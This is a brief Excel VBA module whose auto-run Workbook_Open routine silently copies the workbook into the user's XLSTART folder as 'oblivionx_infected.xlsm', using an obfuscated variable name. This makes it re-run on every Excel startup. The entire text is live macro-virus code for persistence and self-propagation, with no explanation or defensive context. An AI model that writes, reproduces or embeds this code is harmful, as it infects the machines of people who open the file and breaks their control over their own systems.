Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim lckhv437 As String
    lckhv437 = Environ("APPDATA") & "\Microsoft\Excel\XLSTART\oblivionx_infected.xlsm"
    ThisWorkbook.SaveCopyAs lckhv437
End Sub
